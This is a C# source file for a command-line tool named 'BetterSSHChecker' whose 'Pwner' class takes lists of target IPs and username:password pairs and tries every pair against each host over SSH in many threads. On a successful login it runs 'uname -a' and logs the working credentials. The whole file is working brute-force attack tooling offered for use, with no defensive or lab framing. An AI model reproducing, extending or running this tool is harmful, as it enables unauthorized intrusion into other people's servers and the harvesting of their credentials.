using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace BetterSSHChecker
{
    class Program
    {

        
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

        static ConsoleEventDelegate handler;                                          
        private delegate bool ConsoleEventDelegate(int eventType);

        private static Pwner Lord;

        static void Main(string[] args)
        {

            /*  
             * pwner.exe --source:result.txt --userpass:userpass.txt -t 10 -T 10 -mT 5 --dp
             * 
             * 
             */

            handler = new ConsoleEventDelegate(ConsoleEventCallback);
            SetConsoleCtrlHandler(handler, true);

            string ips_source      = "", 
                   userpass_source = "";

            int timeout          = 1, 
                threads          = 1,
                maxTimeoutCount  = 5;

            bool drawProgressBar = false;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].Contains("--source"))
                {
                    ips_source = args[i].Split(":")[1];
                }
                if (args[i].Contains("--userpass"))
                {
                    userpass_source = args[i].Split(":")[1];
                }
                if (args[i].Contains("-t"))
                {
                    timeout = int.Parse(args[i+1]);
                }
                if (args[i].Contains("-T"))
                {
                    threads = int.Parse(args[i+1]);
                }
                if (args[i].Contains("-mT"))
                {
                    maxTimeoutCount = int.Parse(args[i+1]);
                }
                if (args[i].Contains("--dp"))
                {
                    drawProgressBar = true;
                }
            }

            Lord = new Pwner(ips_source, userpass_source, timeout, threads);
            Lord.drawProgressBar = drawProgressBar;
            Lord.maxTimeoutCount = maxTimeoutCount;
            Lord.startCheck();

            Console.ReadKey();

        }

        /// <summary>
        /// Manage callback for console events.
        /// </summary>
        static bool ConsoleEventCallback(int eventType)
        {
            // Closing console
            if (eventType == 2)
            {
                Console.Clear();
                Console.WriteLine("Quitting...");
                Lord.abrutEnd();
            }
            return false;
        }


    }

    /// <summary>
    /// Pwner Class
    /// </summary>
    class Pwner
    {

        private Task[] utilityTasks = new Task[2];
        private Task[] tasks;

        private HashSet<string> IPS              = new HashSet<string>();
        private HashSet<Credentials> credentials = new HashSet<Credentials>();

        int timeout,
            threads;

        bool isUp         = false;

        int runningThread = 0,
            total_attemps = 0,
            testedAttemps = 0,
            testedIPs     = 0;

        public bool drawProgressBar = true;
        public int maxTimeoutCount  = 5;

        /// <summary>
        /// Contening an string username and string password.
        /// </summary>
        private struct Credentials
        {
            public string username;
            public string password;

            /// <param name="username">The <see cref="string"/> instance that represents the username</param>
            /// <param name="password">The <see cref="string"/> instance that represents the password.</param>
            public Credentials(string username, string password)
            {
                this.username = username;
                this.password = password;
            }
        }

        /// <summary>
        /// Contening an Exception Exception and string Uname.
        /// </summary>
        private class SshResponse
        {
            public Exception Exception;
            public string uname;
        }

        /// <summary>
        /// Pwner Constructor, import given files, and execute the prelude.
        /// </summary>
        /// <param name="target_file">The <see cref="string"/> instance that represents the location of the IP file.</param>
        /// <param name="credentials_file">The <see cref="string"/> instance that represents the location of the credentials file.</param>
        /// <param name="timeout">The <see cref="int"/> instance that represents the time in milliseconds before cancellation.</param>
        /// <param name="threads">The <see cref="int"/> instance that represents the numbers of threads.</param>
        public Pwner(string target_file, string credentials_file, int timeout, int threads)
        {
            this.timeout = timeout;
            this.threads = threads;
            import(target_file, credentials_file);
            Prelude();

        }


        /// <summary>
        /// Import given IP and credentials file to feed the class's lists.
        /// </summary>
        /// <param name="target_file">The <see cref="string"/> instance that represents the location of the IP file.</param>
        /// <param name="credentials_file">The <see cref="string"/> instance that represents the location of the credentials file.</param>
        private void import(string target_file, string credentials_file)
        {

            Stopwatch w = new Stopwatch();
            logIt("Importing...");

            w.Start();
                getData<string>(target_file, IPS);
                getData<Credentials>(credentials_file, credentials);
            w.Stop();

            total_attemps = IPS.Count * credentials.Count;

            logIt($"Importated {IPS.Count + credentials.Count} lines in: {w.ElapsedMilliseconds}ms");

        }

        /// <summary>
        /// Shows begining message.
        /// </summary>
        private void Prelude()
        {
            logIt($"Looking for {IPS.Count}*{credentials.Count}:{total_attemps} attempts.");
            logIt($"{IPS.Count * credentials.Count} attemps / {threads}: {total_attemps / threads} per threads");
            Console.WriteLine();
        }

        /// <summary>
        /// Split toExplode into explodeNumber of HashSet.
        /// </summary>
        /// <param name="toExplode">The <see cref="HashSet"/> instance that initial HashSet to split.</param>
        /// <param name="explodeNumber">The <see cref="int"/> instance that represents the number of HashSet in the return list.</param>
        /// <returns>An instance of the <see cref="List"/> class contening explodedNumber of toExplode's splitted string.</returns>
        private List<HashSet<string>> splitHashSet(HashSet<string> toExplode, int explodeNumber)
        {

            List<HashSet<string>> explodedResult = new List<HashSet<string>>();
            
            HashSet<string> tmp = new HashSet<string>();

            int numberOfSets          = explodeNumber,
                numberOfLinePerSet    = IPS.Count / explodeNumber;

            // If decomposable
            if (IPS.Count > threads || numberOfLinePerSet >= 1)
            {
                int sets = 0,
                    i    = 0;

                // Distribute i line for n sets
                foreach (string line in toExplode)
                {

                    tmp.Add(line);
                    i++;

                    //We make sure we only make explodeNumber of sets.
                    if (i == numberOfLinePerSet && sets < numberOfSets)
                    {
                        explodedResult.Add(tmp);
                        tmp = new HashSet<string>();
                        i = 0;
                        sets++;
                    }

                }

                // If there is any ips left, add them to the last set
                if (IPS.Count % numberOfSets > 0)
                {
                    explodedResult[explodedResult.Count-1].UnionWith(tmp);
                }

            } else {
                explodedResult.Add(toExplode);
                threads = 1;
            }

            tmp = null;

            return explodedResult;

        }

        /// <summary>
        /// Start checking every IP from <see cref="IPS"/> divided in n/<see cref="threads"/> worker threads for every credentials.
        /// </summary>
        public void startCheck()
        {

            Stopwatch w = new Stopwatch();

            List<HashSet<string>> ThreadsWorkingSets = splitHashSet(IPS, threads);
            
            w.Start();

            tasks = new Task[ThreadsWorkingSets.Count];

            foreach (HashSet<string> currentSet in ThreadsWorkingSets)
            {

                Task v = new Task(() => {
                        Interlocked.Increment(ref runningThread);
                        // Wait for all the threads to be ready.
                        while(!isUp)
                        {
                            System.Threading.Thread.Sleep(100);
                        }

                        int currentThread = (int)Task.CurrentId;
                       
                        bool exitLoop,
                             tooManyTimeout;

                        int  timeoutCount;

                        foreach (string IP in currentSet)
                        {

                            timeoutCount    = 0;
                            tooManyTimeout  = false;
                            exitLoop        = false;

                            foreach (Credentials cred in credentials)
                            {
                                
                                SshResponse Response = meet(IP, cred.username, cred.password);
                                Interlocked.Increment(ref testedAttemps);

                                if (Response.Exception != null)
                                {

                                    switch (Response.Exception.GetType().ToString())
                                    {
                                        
                                        // Login timed out      -> continue
                                        case "Renci.SshNet.Common.SshOperationTimeoutException":
                                            timeoutCount++;
                                            if (timeoutCount == maxTimeoutCount) tooManyTimeout = true;

                                            logIt($"{IP} timed out! {timeoutCount}/{maxTimeoutCount}", currentThread, false);
                                            break;
                                    
                                        // Network error, is off -> break to next IP
                                        case "System.AggregateException":
                                            logIt($"{IP} is off!", currentThread, false);
                                            exitLoop = true;
                                            break;

                                        // Network error or connection refused -> break to next IP
                                        case "System.Net.Sockets.SocketException":
                                            logIt($"{IP} gone oopsy! \n::{Response.Exception.Message}", currentThread, false);
                                            exitLoop = true;
                                            break;

                                        // Bad authentification / others -> continue
                                        default:
                                            logIt($"{IP}@{cred.username}:{cred.password}", currentThread, false);
                                            break;

                                    }

                                    if (exitLoop || tooManyTimeout) break;
                                  
                                } else {
                                    logIt($"{IP}@{cred.username}:{cred.password} \n-> {Response.uname}", currentThread, true);
                                    Console.Beep();
                                    break;
                                }

                            }


                            Interlocked.Increment(ref testedIPs);

                        }
                        
                       Interlocked.Decrement(ref runningThread);
                });

                v.Start();
                tasks[v.Id-1] = v;
            }

            // Wait Until all threads started
            while (!isUp)
            {
                Console.Write("\r[{0}] Starting Threads... {1}/{2}", DateTime.Now.ToString("hh:mm:ss"), runningThread, ThreadsWorkingSets.Count);

                if (runningThread == ThreadsWorkingSets.Count)
                {
                    isUp = true;
                    Console.WriteLine();
                }

                System.Threading.Thread.Sleep(100);
                
            }
            
            monitorMaster();
            
            Task.WaitAll(tasks);
            isUp = false;
            w.Stop();

            if (utilityTasks[1] != null) 
            {
                Task.WaitAll(utilityTasks);
            } else {
                utilityTasks[0].Wait();
            }

            logIt($"Exec {w.ElapsedMilliseconds}ms");

        }

  
        /// <summary>
        /// Import source file into a HashSet of <typeparamref name="T"/> destination. 
        /// </summary>
        /// <param name="source">The <see cref="string"/> instance that represents the location of the source file.</param>
        /// <param name="destination">The <see cref="HashSet"/> instance that represents the destination of the imported source.</param>
        private void getData<T>(string source, HashSet<T> destination)
        {

            using (StreamReader sr = File.OpenText(source))
            {
                string[] splitted;
                string s = String.Empty;
                while ((s = sr.ReadLine()) != null)
                {
                    if (typeof(T) == typeof(Credentials))
                    {
                        try
                        {
                            splitted = s.Split(':');
                            destination.Add((T)(object)new Credentials(splitted[0], splitted[1]));
                        }
                        catch (Exception) { }

                    } else
                    {
                        destination.Add((T)(object)s);
                    }

                }
            }



        }


        /// <summary>
        /// Connect to an SSH.
        /// </summary>
        /// <param name="targetIP">The <see cref="string"/> instance that represents the target IP.</param>
        /// <param name="user">The <see cref="string"/> instance that represents the login.</param>
        /// <param name="pass">The <see cref="string"/> instance that represents the password.</param>
        /// <returns>An instance of the <see cref="SshResponse"/> class representing the result of the connection, an <see cref="Exception"/> if error; otherwise, an uname.</returns>
        private SshResponse meet(string targetIP, string user, string pass)
        {

            SshResponse response = new SshResponse();
            try
            {

                using (var client = new SshClient(targetIP, user, pass))
                {
                    client.ConnectionInfo.Timeout = TimeSpan.FromMilliseconds(timeout);
                    client.Connect();

                    SshCommand runcommand = client.CreateCommand("uname -a");
                    runcommand.CommandTimeout = TimeSpan.FromMilliseconds(10000);
                    response.uname = runcommand.Execute(); ;

                    client.Disconnect();
                }

            }
            catch (Exception wank)
            {
                // System.Net.Sockets.SocketException
                // Renci.SshNet.Common.SshOperationTimeoutException
                // System.AggregateException 
                response.Exception = wank;
                //response.Exeception = new Exception();
            }

            return response;

            
        }

        /// <summary>
        /// Write a message to the console with "[Current Time] message" syntax.
        /// </summary>
        /// <param name="message">The <see cref="string"/> instance that represents the message to display</param>
        private void logIt(string message)
        {

            string tmp = string.Format("[{0}] {1}", DateTime.Now.ToString("hh:mm:ss"), message);
            Console.WriteLine("\r{0}{1}", tmp, new string(' ', tmp.Length > 100 ? 0 : Console.WindowWidth - tmp.Length));
        }

        /// <summary>
        /// Write a message to the console with "[Current Time] #Wich Thread (+/-) message" syntax.
        /// </summary>
        /// <param name="message">The <see cref="string"/> instance that represents the message to display/param>
        /// <param name="thread">The <see cref="int"/> instance that represents the caller's thread number./param>
        /// <param name="success">The <see cref="bool"/> instance that represents if success or not (+/-).</param>
        private void logIt(string message, int thread, bool success)
        {
            string tmp = string.Format("[{0}]#T{1}({2}) {3}", DateTime.Now.ToString("hh:mm:ss"), thread, success ? "+" : "-", message);
            // Display [message][blank] to erase the previous's progressbar.
            // We also check that the message is shorter than ne console length.
            Console.WriteLine("\r{0}{1}", tmp, new string(' ', tmp.Length > 100 ?0:Console.WindowWidth - tmp.Length));
        }

        /// <summary>
        /// Change console title to "{tested attemps/total} attemps r{number of attemps per second) r{number of attemps per minute}
        /// </summary>
        private void monitorMaster()
        {

            // Monitor rates
            Task masterConsole = new Task(() =>
            {
                int last_tested = 0;
                int minute_count = 0;
                int minute_tested = 0;
                int minute_rate = 0;

                while (isUp)
                {
                    Console.Title = String.Format("{0}/{1} r{2}/s r{3}/m", testedAttemps, total_attemps, testedAttemps - last_tested, minute_rate);
                    last_tested = testedAttemps;
                    System.Threading.Thread.Sleep(1000);

                    if (minute_count == 60)
                    {
                        minute_rate = testedAttemps - minute_tested;
                        minute_count = 0;
                        minute_tested = testedAttemps;

                    }
                    else
                    {
                        minute_count++;
                    }
                }

                // Last update
                Console.Title = String.Format("{0}/{1} r{2}/s r{3}/m", testedAttemps, total_attemps, testedAttemps - last_tested, minute_rate);

            });

            if (drawProgressBar)
            {
                Task masterProgressBar = new Task(() => {
                    monitorProgressBar();
                });
                utilityTasks[1] = masterProgressBar;
                masterProgressBar.Start();
            }

            utilityTasks[0] = masterConsole;
            masterConsole.Start();

        }

        /// <summary>
        /// Draw a progressbar at the bottom of the console, [=100=] 0.00%.
        /// </summary>
        private void monitorProgressBar()
        {

            int x;
            int y;
            float pourcentage = 0;
            string done       = "";
            string toDo       = "";

            /*
             * Draw progress bar while checking is running.
             */
            while (isUp)
            {

                /*
                 * Compute progressbar
                 */
                pourcentage = (float)testedIPs / IPS.Count * 100;
                done = string.Concat(Enumerable.Repeat("█", Convert.ToInt32(pourcentage)));
                toDo = string.Concat(Enumerable.Repeat("░", 100 - (Convert.ToInt32(pourcentage))));

                /*
                 * Get old cursor position
                 */
                x = Console.CursorLeft;
                y = Console.CursorTop;

                /*
                 * Set cursor to bottom line
                 */
                Console.CursorTop = Console.WindowTop + Console.WindowHeight - 1;
                
                /*
                 * Draw the bar
                 */
                Console.Write($"[{done}{toDo}] {pourcentage:0.00#}%");

                /*
                 * Move cursor to the old position
                 */
                Console.SetCursorPosition(x, y);

                System.Threading.Thread.Sleep(100);

            }


            // Last update
            pourcentage = (float)testedIPs / IPS.Count * 100;
            done = string.Concat(Enumerable.Repeat("█", Convert.ToInt32(pourcentage)));
            toDo = string.Concat(Enumerable.Repeat("░", 100 - (Convert.ToInt32(pourcentage))));
            Console.CursorTop = Console.WindowTop + Console.WindowHeight - 1;
            Console.Write($"\r[{done}{toDo}] {pourcentage:0.00#}%");

        }

        /// <summary>
        /// Send end signal and wait for every threads to stop.
        /// </summary>
        public void abrutEnd()
        {
            isUp = false;
            Task.WaitAll(utilityTasks);
            Task.WaitAll(tasks);
        }
    }

}
